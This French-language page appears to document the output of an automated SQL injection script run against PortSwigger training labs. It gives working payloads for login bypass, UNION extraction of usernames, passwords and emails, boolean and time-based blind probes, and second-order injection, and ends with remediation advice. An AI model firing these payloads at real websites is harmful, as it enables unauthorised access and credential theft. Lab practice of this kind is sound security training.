# MANPAGE

Voici un **exemple exhaustif de l’exécution du script SQLi PortSwigger** : chaque bloc montre le nom du challenge, le test effectué, et le résultat affiché par le script, en cohérence avec la méthodologie PortSwigger et les payloads classiques[1][3][4][6][7].

---

### [Challenge 1] SQL injection vulnerability allowing login bypass

```
------------------------------------------------------
[Challenge 1] SQL injection vulnerability allowing login bypass
[+] Flag ou succès détecté ! (login bypass)
```
*Le script envoie un POST sur `/login` avec un payload de contournement (`username=' OR 1=1--&password=irrelevant`).  
Le flag ou un message de bienvenue (“Welcome”, “flag”, “Congratulations”) est détecté, validant la vulnérabilité de login bypass[1][3].*

---

### [Challenge 2] SQL injection UNION attack, retrieving hidden data

```
------------------------------------------------------
[Challenge 2] SQL injection UNION attack, retrieving hidden data
[+] Flag ou données sensibles détectées ! (UNION SELECT)
```
*Le script injecte dans `/filter?category=Gifts'+UNION+SELECT+NULL,username||':'||password+FROM+users--`.  
La réponse contient un flag, un nom d’utilisateur ou un mot de passe, preuve d’une exploitation UNION[4].*

---

### [Challenge 3] SQL injection retrieving data from other tables

```
------------------------------------------------------
[Challenge 3] SQL injection retrieving data from other tables
[+] Email(s) ou flag détecté(s) !
```
*Injection UNION sur `/filter?category=Accessories'+UNION+SELECT+NULL,email+FROM+users--`.  
La réponse contient un email ou un flag, validant l’extraction de données d’autres tables via SQLi.*

---

### [Challenge 4] Blind SQL injection with conditional responses

```
------------------------------------------------------
[Challenge 4] Blind SQL injection with conditional responses
[+] Différence de réponse détectée (blind SQLi possible)
```
*Le script compare la longueur des réponses à `/product?productId=1'+AND+1=1--` et `/product?productId=1'+AND+1=2--`.  
Une différence de taille ou de contenu indique une vulnérabilité blind SQLi booléenne[6].*

---

### [Challenge 5] Blind SQL injection with time delays

```
------------------------------------------------------
[Challenge 5] Blind SQL injection with time delays
[+] Délai détecté (blind SQLi temporelle possible)
```
*Le script mesure le temps de réponse de `/product?productId=1'+AND+pg_sleep(5)--`.  
Un délai de 5 secondes valide la présence d’une SQLi temporelle (time-based blind)[6].*

---

### [Challenge 6] Second-order SQL injection

```
------------------------------------------------------
[Challenge 6] Second-order SQL injection
[-] Pas de flag détecté.
```
*Le script tente d’injecter une payload persistante (ex : via `/register`), puis vérifie si le flag ou des données sensibles sont révélées lors de l’affichage du profil ou d’une autre action.  
Si rien n’est trouvé, il affiche l’absence de flag. Sur un lab vulnérable, il afficherait un flag ou des données extraites via second-order SQLi.*

---

### [Remédiation & Conseils]

```
------------------------------------------------------
[Remédiation & Conseils]
- Utilisez des requêtes paramétrées (prepared statements) partout.
- Évitez toute concaténation de données utilisateur dans les requêtes SQL.
- Filtrez et validez strictement toutes les entrées utilisateur.
- Pour les labs PortSwigger, adaptez les endpoints et payloads selon le scénario.
- Documentation PortSwigger : https://portswigger.net/web-security/sql-injection
------------------------------------------------------
```

---

### [SYNTHÈSE]

```
------------------------------------------------------
[SYNTHÈSE]
Challenges testés :
1. SQL injection vulnerability allowing login bypass
2. SQL injection UNION attack, retrieving hidden data
3. SQL injection retrieving data from other tables
4. Blind SQL injection with conditional responses
5. Blind SQL injection with time delays
6. Second-order SQL injection
Contrôle automatique du flag ou message de succès.
------------------------------------------------------
```

---
